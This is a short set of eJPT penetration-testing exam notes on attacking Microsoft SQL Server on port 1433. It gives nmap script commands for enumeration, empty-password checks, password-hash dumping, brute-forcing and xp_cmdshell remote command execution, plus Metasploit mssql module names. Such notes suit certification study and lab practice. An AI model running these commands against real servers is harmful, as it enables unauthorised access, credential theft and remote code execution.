## MSSQL - p1433

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)

### Nmap

Check for service details.
```
nmap 10.10.10.1 -p 1433 --script ms-sql-info
```
Check for more service/server information.
```
nmap 10.10.10.1 -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
```
Check if access with an empty password is enabled.
```
nmap 10.10.10.1 -p 1433 --script ms-sql-empty-password
```
Retrieve informations, usernames, privileges and database configuration info.
```
nmap 10.10.10.1 -p 1433 --script ms-sql-query --script-args mssql.username=username, mssql.password=password, ms-sql-query.query=“Select * from master..syslogins” -oN output.txt
```
Perform a dump of all usernames and passwords.
```
nmap 10.10.10.1 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=username, mssql.password=password
```
Execute remote commands.
```
nmap 10.10.10.1 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=username, mssql.password=password, ms-sql.cmdshell.cmd=“ipconfig”

nmap 10.10.10.1 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=username, mssql.password=password, ms-sql-cmdshell.cmd=“type c:\flag.txt”
```
Perform a brute-force attack on the service.
```
nmap 10.10.10.1 -p 1433 --script ms-sql-brute --script-args userdb=commonusers.txt, passdb=commonpassword.txt
```

### METASPLOIT
```
msfconsole auxiliary scanner/mssql/mssql_login
msfconsole auxiliary admin/mssql/mssql_enum
msfconsole auxiliary admin/mssql/mssql_enum_sql_login
msfconsole auxiliary admin/mssql/mssql_exec
msfconsole auxiliary admin/mssql/mssql_enum_domain_accounts
```
